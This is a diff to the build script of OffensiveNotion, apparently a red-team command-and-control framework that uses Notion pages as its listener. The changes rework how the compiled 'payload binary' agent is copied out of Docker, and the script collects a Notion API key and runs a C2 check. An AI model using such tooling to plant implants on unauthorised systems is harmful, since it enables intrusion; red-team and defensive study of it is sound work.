@@ -86,7 +86,8 @@ def take_in_vars():
     Intakes vars for Sleep, API Key, and Parent Page ID.
     """
     # Sleep
-    sleep_interval = ask_for_input(important + "Enter the number of seconds for the agent's sleep interval [default is 30][format: #]", 30)
+    sleep_interval = ask_for_input(
+        important + "Enter the number of seconds for the agent's sleep interval [default is 30][format: #]", 30)
     print(good + "Sleep interval: {}".format(sleep_interval))
     # API Key
     api_key = getpass.getpass(important + "Enter your Notion Developer Account API key > ")
@@ -94,10 +95,10 @@ def take_in_vars():
     # Parent Page ID
     print(
         "\n" + important + "Your notion page's parent ID is the long number at the end of the page's URL.\n[*] For example, "
-                    "if your page "
-                    "URL is '[https://]www[.]notion[.]so/LISTENER-11223344556677889900112233445566', then your parent "
-                    "page ID is "
-                    "11223344556677889900112233445566\n")
+                           "if your page "
+                           "URL is '[https://]www[.]notion[.]so/LISTENER-11223344556677889900112233445566', then your parent "
+                           "page ID is "
+                           "11223344556677889900112233445566\n")
     parent_page_id = input(important + "Enter your listener's parent page ID > ")
     print(good + "Parent page ID: {}".format(parent_page_id))
     json_vars = {
@@ -193,11 +194,27 @@ def docker_run():
 # Copy agent out to physical system
 def docker_copy():
     print(info + "Copying payload binary to host...")
+
+    # All possible outcomes are:
+    #  Linux DEBUG: bin/target/debug/offensive_notion
+    #  Linux RELEASE: bin/target/release/offensive_notion
+    #  Windows DEBUG = bin/target/x86_64-pc-windows-gnu/debug/offensive_notion.exe
+    #  Windows RELEASE bin/target/x86_64-pc-windows-gnu/release/offensive_notion.exe
+
+    # HuskyHacksTogetherAPythonScript strikes again
+    if args.os == "windows":
+        agent_path = "x86_64-pc-windows-gnu"
+        bin_dir_folder = "windows_" + args.build
+    if args.os == "linux":
+        agent_path = args.build
+        bin_dir_folder = "linux_" + args.build
+
     try:
-        sub.call(['docker cp offensivenotion:/opt/OffensiveNotion/target/ bin/ 1>/dev/null'], shell=True)
-        exists = os.path.isdir(bin_dir + "/target")
+        sub.call(['docker cp offensivenotion:/opt/OffensiveNotion/target/{} bin/{} 1>/dev/null'.format(agent_path, bin_dir_folder)], shell=True)
+        print("bin/{}/{}".format(agent_path, bin_dir_folder))
+        exists = os.path.isdir("bin/{}/{}".format(bin_dir_folder, agent_path))
         if exists:
-            print(good + "Success! Agents are located in the OffensiveNotion/bin/ directory on this host.")
+            print(good + "Success! Agent is located at bin/{} on this host.".format(bin_dir_folder))
             return True
     except Exception as e:
         print(printError + str(e))
@@ -241,6 +258,7 @@ def c2_lint(json_string):
         print(good + "C2 check passed! Check your Notion notebook for a C2_LINT_TEST page.")
     else:
         print(printError + "C2 check failed. Check your config.json file.")
+
 
 def main():
     is_root()
